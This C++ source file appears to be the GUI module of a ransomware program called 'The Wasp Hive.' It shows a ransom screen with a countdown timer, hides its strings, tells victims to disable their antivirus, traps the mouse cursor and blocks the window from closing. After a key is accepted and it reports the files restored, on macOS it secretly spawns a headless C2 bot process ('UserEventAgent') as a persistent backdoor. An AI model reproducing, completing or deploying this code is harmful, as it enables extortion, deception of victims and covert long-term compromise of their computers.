// ============================================================================
// gui.cpp — Ransomware GUI Implementation (wxWidgets)
// ============================================================================
// Extracted from MWare.cpp lines 4084-4467.
// Uses obfuscated strings via OBF() macro throughout.
// ============================================================================

#include "gui.h"

#ifndef HEADLESS

#include <wx/wx.h>
#include <wx/timer.h>
#include <wx/dcbuffer.h>
#include <wx/statbmp.h>
#include <wx/file.h>
#include <wx/filename.h>
#include <wx/stdpaths.h>
#include <wx/image.h>
#include <wx/msgdlg.h>

#include "obfuscation.h"
#include "crypto.h"  // decryption functions
#include "c2_agent.h" // g_c2_agent for disconnect() and global ptr
#include <cstdio>      // fprintf(), fopen(), fclose()
#include <cstring>     // strerror() for posix_spawn error reporting

// macOS mouse trapping requires CoreGraphics framework (via ApplicationServices)
#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <spawn.h>      // posix_spawn(), posix_spawn_file_actions_t
#include <fcntl.h>      // O_RDONLY, O_WRONLY for /dev/null redirect
#include <unistd.h>     // _exit()
#endif

// ============================================================================
// Pixel Font Data — 7x5 matrices for digits 0-9 + colon at index 10
// ============================================================================
const int PixelDigit::digits[11][7][5] = {
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,0,1,0,0}, {0,1,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,1,1,1,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,1,1,0,0}, {1,1,0,0,0}, {1,1,1,1,1}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,0,1,1,0}, {0,1,0,1,1}, {1,1,0,1,1}, {1,1,1,1,1}, {0,0,0,1,1}, {0,0,0,1,1}, {0,0,0,1,1}},
    {{1,1,1,1,1}, {1,1,0,0,0}, {1,1,1,1,0}, {0,0,0,1,1}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,0,0}, {1,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{1,1,1,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,0,1,1,0}, {0,1,1,0,0}, {0,1,1,0,0}, {0,1,1,0,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,1}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,0,0,0,0}, {0,0,1,1,0}, {0,0,1,1,0}, {0,0,0,0,0}, {0,0,1,1,0}, {0,0,1,1,0}, {0,0,0,0,0}}
};

// ============================================================================
// PixelTimerPanel Implementation
// ============================================================================
PixelTimerPanel::PixelTimerPanel(wxWindow* parent, int h, int m, int s)
    : wxPanel(parent, wxID_ANY, wxDefaultPosition, wxSize(500, 80)),
      hours(h), minutes(m), seconds(s), pixelColor(255, 50, 50), pixelSize(6) {
    SetBackgroundColour(wxColour(0, 0, 0));
}

void PixelTimerPanel::SetTime(int h, int m, int s) {
    hours = h; minutes = m; seconds = s;
    Refresh();
}

void PixelTimerPanel::SetPixelColor(wxColour c) {
    pixelColor = c;
    Refresh();
}

void PixelTimerPanel::OnPaint(wxPaintEvent& event) {
    wxPaintDC dc(this);
    dc.SetBackground(wxBrush(wxColour(0, 0, 0)));
    dc.Clear();

    int timeDigits[6] = {hours/10, hours%10, minutes/10, minutes%10, seconds/10, seconds%10};
    int digitW = 5 * pixelSize;
    int colonW = 2 * pixelSize;
    int spacing = pixelSize;
    int groupSpace = pixelSize * 3;

    int totalW = (6 * digitW) + (2 * colonW) + (4 * spacing) + (2 * groupSpace);
    int x = (GetSize().GetWidth() - totalW) / 2;
    int y = 15;

    for (int i = 0; i < 6; i++) {
        DrawDigit(dc, x, y, timeDigits[i]);
        x += digitW + spacing;
        if (i == 1 || i == 3) {
            DrawDigit(dc, x, y, 10);
            x += colonW + groupSpace;
        }
    }
}

void PixelTimerPanel::DrawDigit(wxDC& dc, int x, int y, int d) {
    dc.SetBrush(wxBrush(pixelColor));
    dc.SetPen(wxPen(pixelColor));
    for (int row = 0; row < 7; row++) {
        for (int col = 0; col < 5; col++) {
            if (PixelDigit::digits[d][row][col] == 1) {
                dc.DrawRectangle(x + col*pixelSize, y + row*pixelSize, pixelSize-1, pixelSize-1);
            }
        }
    }
}

wxBEGIN_EVENT_TABLE(PixelTimerPanel, wxPanel)
    EVT_PAINT(PixelTimerPanel::OnPaint)
wxEND_EVENT_TABLE()

// ============================================================================
// Warning Icon Helper
// ============================================================================
wxStaticBitmap* CreateWarningIcon(wxWindow* parent, int size) {
    wxString path = wxGetCwd() + wxFileName::GetPathSeparator() + "Warning-Icon.png";
    if (!wxFileExists(path)) {
        path = wxFileName(wxStandardPaths::Get().GetExecutablePath()).GetPath() +
               wxFileName::GetPathSeparator() + "Warning-Icon.png";
    }
    if (wxFileExists(path)) {
        wxImage img(path, wxBITMAP_TYPE_PNG);
        if (img.IsOk()) {
            img.Rescale(size, size, wxIMAGE_QUALITY_HIGH);
            return new wxStaticBitmap(parent, wxID_ANY, wxBitmap(img));
        }
    }
    return nullptr;
}

// ============================================================================
// RansomwareFrame Implementation
// ============================================================================
RansomwareFrame::RansomwareFrame()
    : wxFrame(nullptr, wxID_ANY, OBF("The Wasp Hive"),
              wxDefaultPosition, wxSize(850, 650)),
      timer(nullptr), mouseTrackerTimer(nullptr),
      hours(4), minutes(0), seconds(36),
      pixelTimerPanel(nullptr), passwordInput(nullptr), canClose(false) {

    SetBackgroundColour(wxColour(0, 0, 0));
    SetMinSize(wxSize(800, 600));

    wxPanel* panel = new wxPanel(this);
    panel->SetBackgroundColour(wxColour(0, 0, 0));

    wxBoxSizer* mainSizer = new wxBoxSizer(wxVERTICAL);

    // Logo
    wxString beePath = wxGetCwd() + wxFileName::GetPathSeparator() + "bee.png";
    if (!wxFileExists(beePath)) {
        beePath = wxFileName(wxStandardPaths::Get().GetExecutablePath()).GetPath() +
                  wxFileName::GetPathSeparator() + "bee.png";
    }
    if (wxFileExists(beePath)) {
        wxImage img(beePath, wxBITMAP_TYPE_PNG);
        if (img.IsOk()) {
            img.Rescale(120, 120, wxIMAGE_QUALITY_HIGH);
            mainSizer->Add(new wxStaticBitmap(panel, wxID_ANY, wxBitmap(img)),
                          0, wxALIGN_CENTER | wxTOP | wxBOTTOM, 10);
        }
    }

    // Title
    wxStaticText* title = new wxStaticText(panel, wxID_ANY, OBF("THE WASP HIVE"));
    title->SetForegroundColour(wxColour(255, 215, 0));
    wxFont titleFont(36, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD);
    title->SetFont(titleFont);
    mainSizer->Add(title, 0, wxALIGN_CENTER | wxBOTTOM, 15);

    // Info panel
    wxPanel* infoPanel = new wxPanel(panel);
    infoPanel->SetBackgroundColour(wxColour(15, 15, 15));
    wxBoxSizer* infoSizer = new wxBoxSizer(wxVERTICAL);

    // Subtitle with warning icon
    wxBoxSizer* subSizer = new wxBoxSizer(wxHORIZONTAL);
    if (wxStaticBitmap* icon = CreateWarningIcon(infoPanel, 28)) {
        subSizer->Add(icon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 8);
    }
    wxStaticText* sub = new wxStaticText(infoPanel, wxID_ANY, "What Happened to My Files?");
    sub->SetForegroundColour(wxColour(255, 165, 0));
    sub->SetFont(wxFont(16, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
    subSizer->Add(sub, 0, wxALIGN_CENTER_VERTICAL);
    infoSizer->Add(subSizer, 0, wxALL, 12);

    // Description text
    wxString desc = wxString("All important files on your system have been locked using military-grade AES-256 encryption. "
                   "Your documents, photos, videos, databases, and other critical data are now inaccessible.\n\n")
                   + OBF("WASP HIVE ENCRYPTION SYSTEM:\n")
                   + "Protected by industry-standard RSA-4096 asymmetric encryption. "
                   + OBF("Your private decryption key is stored on our secure servers.\n\n");

    wxStaticText* descText = new wxStaticText(infoPanel, wxID_ANY, desc);
    descText->SetForegroundColour(wxColour(200, 200, 200));
    descText->SetFont(wxFont(11, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_NORMAL));
    descText->Wrap(700);
    infoSizer->Add(descText, 0, wxLEFT | wxRIGHT | wxBOTTOM, 12);

    // Warnings section with icon
    wxBoxSizer* warnHeaderSizer = new wxBoxSizer(wxHORIZONTAL);
    if (wxStaticBitmap* warnIcon = CreateWarningIcon(infoPanel, 20)) {
        warnHeaderSizer->Add(warnIcon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 6);
    }
    wxStaticText* warnHeader = new wxStaticText(infoPanel, wxID_ANY, "IMPORTANT WARNINGS:");
    warnHeader->SetForegroundColour(wxColour(255, 100, 100));
    warnHeader->SetFont(wxFont(12, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
    warnHeaderSizer->Add(warnHeader, 0, wxALIGN_CENTER_VERTICAL);
    infoSizer->Add(warnHeaderSizer, 0, wxLEFT | wxRIGHT | wxBOTTOM, 8);

    // Warning list
    wxString warnings[] = {
        OBF("DO NOT rename encrypted files - this may cause permanent data loss"),
        OBF("DO NOT use third-party decrypt tools - files may be corrupted"),
        OBF("Disable antivirus software - it may delete the decryptor"),
        "System restore will NOT work - encryption is irreversible"
    };

    for (const wxString& w : warnings) {
        wxBoxSizer* wSizer = new wxBoxSizer(wxHORIZONTAL);
        wSizer->AddSpacer(20);
        if (wxStaticBitmap* icon = CreateWarningIcon(infoPanel, 14)) {
            wSizer->Add(icon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 6);
        }
        wxStaticText* wt = new wxStaticText(infoPanel, wxID_ANY, w);
        wt->SetForegroundColour(wxColour(180, 180, 180));
        wt->SetFont(wxFont(10, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_NORMAL));
        wSizer->Add(wt, 0, wxALIGN_CENTER_VERTICAL);
        infoSizer->Add(wSizer, 0, wxLEFT | wxRIGHT | wxBOTTOM, 4);
    }

    infoPanel->SetSizer(infoSizer);
    mainSizer->Add(infoPanel, 0, wxEXPAND | wxLEFT | wxRIGHT, 30);

    mainSizer->AddSpacer(15);

    // Pixel timer
    pixelTimerPanel = new PixelTimerPanel(panel, hours, minutes, seconds);
    mainSizer->Add(pixelTimerPanel, 0, wxALIGN_CENTER | wxBOTTOM, 15);

    // Password section
    wxBoxSizer* passSizer = new wxBoxSizer(wxHORIZONTAL);

    wxStaticText* passLabel = new wxStaticText(panel, wxID_ANY, OBF("ENTER DECRYPTION KEY:"));
    passLabel->SetForegroundColour(wxColour(255, 215, 0));
    passLabel->SetFont(wxFont(12, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
    passSizer->Add(passLabel, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 10);

    passwordInput = new wxTextCtrl(panel, wxID_ANY, "",
                                   wxDefaultPosition, wxSize(250, 30),
                                   wxTE_PASSWORD | wxTE_CENTER);
    passwordInput->SetBackgroundColour(wxColour(30, 30, 30));
    passwordInput->SetForegroundColour(wxColour(255, 215, 0));
    passwordInput->SetFont(wxFont(14, wxFONTFAMILY_MODERN, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
    passSizer->Add(passwordInput, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 10);

    wxButton* btn = new wxButton(panel, wxID_ANY, "UNLOCK FILES",
                                 wxDefaultPosition, wxSize(130, 30), wxBORDER_NONE);
    btn->SetBackgroundColour(wxColour(220, 50, 50));
    btn->SetForegroundColour(wxColour(255, 255, 255));
    btn->SetFont(wxFont(11, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
    passSizer->Add(btn, 0, wxALIGN_CENTER_VERTICAL);

    mainSizer->Add(passSizer, 0, wxALIGN_CENTER | wxBOTTOM, 12);

    // Bottom warning
    wxBoxSizer* bottomWarnSizer = new wxBoxSizer(wxHORIZONTAL);
    if (wxStaticBitmap* icon = CreateWarningIcon(panel, 16)) {
        bottomWarnSizer->Add(icon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 6);
    }
    wxStaticText* bottomWarn = new wxStaticText(panel, wxID_ANY, "WRONG KEY = PERMANENT DATA LOSS");
    bottomWarn->SetForegroundColour(wxColour(255, 50, 50));
    bottomWarn->SetFont(wxFont(10, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
    bottomWarnSizer->Add(bottomWarn, 0, wxALIGN_CENTER_VERTICAL);
    mainSizer->Add(bottomWarnSizer, 0, wxALIGN_CENTER | wxBOTTOM, 10);

    panel->SetSizer(mainSizer);

    // Timer setup
    timer = new wxTimer(this, 1001);
    timer->Start(1000);
    Bind(wxEVT_TIMER, &RansomwareFrame::OnTimer, this, 1001);

    // Mouse tracker timer
    mouseTrackerTimer = new wxTimer(this, 1002);
    mouseTrackerTimer->Start(50);
    Bind(wxEVT_TIMER, &RansomwareFrame::OnMouseTracker, this, 1002);

    btn->Bind(wxEVT_BUTTON, &RansomwareFrame::OnUnlock, this);

    Bind(wxEVT_CLOSE_WINDOW, &RansomwareFrame::OnClose, this);

    Centre();
}

void RansomwareFrame::OnMouseTracker(wxTimerEvent& event) {
    wxPoint mousePos = wxGetMousePosition();
    wxPoint winPos = GetScreenPosition();
    wxSize winSize = GetSize();

    int winLeft = winPos.x;
    int winRight = winPos.x + winSize.x;
    int winTop = winPos.y;
    int winBottom = winPos.y + winSize.y;

    bool outside = false;
    int newX = mousePos.x;
    int newY = mousePos.y;

    if (mousePos.x < winLeft) {
        newX = winLeft + 10;
        outside = true;
    } else if (mousePos.x > winRight) {
        newX = winRight - 10;
        outside = true;
    }

    if (mousePos.y < winTop) {
        newY = winTop + 10;
        outside = true;
    } else if (mousePos.y > winBottom) {
        newY = winBottom - 10;
        outside = true;
    }

    if (outside) {
        #ifdef _WIN32
            SetCursorPos(newX, newY);
        #elif defined(__APPLE__)
            CGPoint point = CGPointMake(newX, newY);
            CGWarpMouseCursorPosition(point);
        #else
            WarpPointer(newX, newY);
        #endif
    }
}

void RansomwareFrame::OnClose(wxCloseEvent& event) {
    if (!canClose) {
        wxMessageBox(OBF("YOUR FILES ARE ENCRYPTED!\n\nEnter the correct decryption key to unlock."),
                    OBF("\u26A0 CRITICAL WARNING \u26A0"), wxOK | wxICON_ERROR, this);
        event.Veto();
    } else {
        event.Skip();
    }
}

void RansomwareFrame::OnTimer(wxTimerEvent& event) {
    seconds--;
    if (seconds < 0) { seconds = 59; minutes--; }
    if (minutes < 0) { minutes = 59; hours--; }
    if (hours < 0) { hours = minutes = seconds = 0; timer->Stop(); }
    pixelTimerPanel->SetTime(hours, minutes, seconds);
}

void RansomwareFrame::OnUnlock(wxCommandEvent& event) {
    wxString key = passwordInput->GetValue();
    if (key.IsEmpty()) {
        wxMessageBox(OBF("Enter decryption key!"), "Error", wxOK | wxICON_EXCLAMATION, this);
        return;
    }

    std::string provided_key = std::string(key.mb_str());

    if (decryptTargetFile(provided_key)) {
        wxMessageBox(OBF("\u2713 DECRYPTION SUCCESSFUL!\n\nYour files have been restored."),
                    "Success", wxOK | wxICON_INFORMATION, this);

        // ============================================================================
        // CHILD-PROCESS BACKDOOR: MWare-gui exits, UserEventAgent takes over.
        //
        // Flow:
        //   1. Disconnect C2Agent → MWare-gui drops from RSW's bot list
        //   2. posix_spawn(UserEventAgent) → headless C2 binary (no GUI)
        //   3. _exit(0) → MWare-gui process terminates completely
        //
        // posix_spawn() is thread-safe (unlike fork) — no wxWidgets deadlocks,
        // no OpenSSL corruption, no SIGHUP/SIGPIPE in child. The spawned process
        // has its own address space, its own TLS context, and connects to RSW
        // independently. It survives MWare-gui exit and runs as a stealth bot.
        //
        // stdin/stdout/stderr are redirected to /dev/null so the child has no
        // terminal dependency and no visible output.
        // ============================================================================

        // Log entry
        FILE* c2log = fopen("/tmp/mware_c2.log", "a");

        // Stop all GUI timers
        if (mouseTrackerTimer) { mouseTrackerTimer->Stop(); }
        if (timer) { timer->Stop(); }

#ifdef __APPLE__
        // 1. Stop the background C2 thread FIRST, then disconnect.
        //
        // RACE FIX: disconnect() only closes the socket — it does not stop the
        // detached background thread. That thread was still inside
        // `while (running)` with running == true. As soon as its blocking
        // recv() returned (socket closed / server sent data), it fell into the
        // `if (!connected)` branch and called connect() again, re-registering
        // the SAME bot_id on RSW as a second/ghost entry — right before this
        // process dies at the _exit(0) below.
        //
        // Setting running = false first makes the thread exit at its next loop
        // check instead of reconnecting. Order matters: stopBackgroundThread()
        // only flips the flag, so disconnect() still has to run to tell RSW to
        // drop MWare-gui's entry.
        if (g_c2_agent) {
            g_c2_agent->stopBackgroundThread();  // running = false → no reconnect
            g_c2_agent->disconnect();            // socket close → RSW drops us
        }

        // 2. Resolve UserEventAgent path (same directory as MWare-gui)
        wxString exeDir = wxFileName(wxStandardPaths::Get().GetExecutablePath()).GetPath();
        wxString childPath = exeDir + wxFileName::GetPathSeparator() + "UserEventAgent";

        // BUGFIX: keep the wxCharBuffer ALIVE for the whole spawn sequence.
        // childPath.mb_str() returns a TEMPORARY wxCharBuffer; calling .data()
        // on it yields a pointer into freed memory the moment the statement ends.
        // The posix_spawn_file_actions_* calls below malloc() and can clobber
        // that freed block → posix_spawn would exec a garbage path (ENOENT /
        // EFAULT) or crash. A named local keeps argv[0] AND the path argument
        // valid until posix_spawn() returns. This is what made the child
        // spawn unreliable in the field.
        wxCharBuffer childPathBuf = childPath.mb_str();
        char* childPathCStr = childPathBuf.data();

        if (c2log) {
            fprintf(c2log, "[C2] Spawning child: %s\n", childPathCStr);
        }

        // Pre-flight: fail loudly if the child binary was never built.
        // posix_spawn would silently return ENOENT (ret=2) — log the real
        // cause so the operator sees it immediately in /tmp/mware_c2.log.
        if (!wxFileExists(childPath)) {
            if (c2log) {
                fprintf(c2log, "[C2] ERROR: child binary missing: %s (run 'make UserEventAgent')\n", childPathCStr);
            }
        }

        // 3. posix_spawn: create detached child process
        //    Thread-safe (no fork), 100% reliable process creation on macOS/POSIX.
        //    Redirect stdin/stdout/stderr to /dev/null — child runs silently.
        pid_t childPid = -1;
        char* childArgv[] = {childPathCStr, nullptr};
        extern char** environ;  // macOS: not auto-declared by <unistd.h> on clang++

        posix_spawn_file_actions_t actions;
        posix_spawn_file_actions_init(&actions);
        posix_spawn_file_actions_addopen(&actions, 0, "/dev/null", O_RDONLY, 0);  // stdin
        posix_spawn_file_actions_addopen(&actions, 1, "/dev/null", O_WRONLY, 0);  // stdout
        posix_spawn_file_actions_addopen(&actions, 2, "/dev/null", O_WRONLY, 0);  // stderr

        int spawnRet = posix_spawn(&childPid, childPathCStr,
                                   &actions, nullptr,
                                   childArgv,
                                   environ);
        posix_spawn_file_actions_destroy(&actions);

        if (c2log) {
            fprintf(c2log, "[C2] posix_spawn: ret=%d (%s) pid=%d\n",
                    spawnRet, spawnRet == 0 ? "OK" : strerror(spawnRet), childPid);
        }
#endif

        if (c2log) fclose(c2log);

        // 4. Exit MWare-gui completely — window closes, process terminates.
        //    UserEventAgent (child) survives independently with its own TLS+C2.
        canClose = true;
        Close(true);
        _exit(0);
    } else {
        wxMessageBox(OBF("\u2717 WRONG DECRYPTION KEY!\n\nYour files remain encrypted.\nTry again or contact support."),
                    OBF("Decryption Failed"), wxOK | wxICON_ERROR, this);
    }
}

RansomwareFrame::~RansomwareFrame() {
    if (timer) { timer->Stop(); delete timer; }
}

// ============================================================================
// RansomwareApp Implementation
// ============================================================================
bool RansomwareApp::OnInit() {
    wxInitAllImageHandlers();
    wxImage::AddHandler(new wxPNGHandler());
    (new RansomwareFrame())->Show(true);
    return true;
}

#endif // HEADLESS
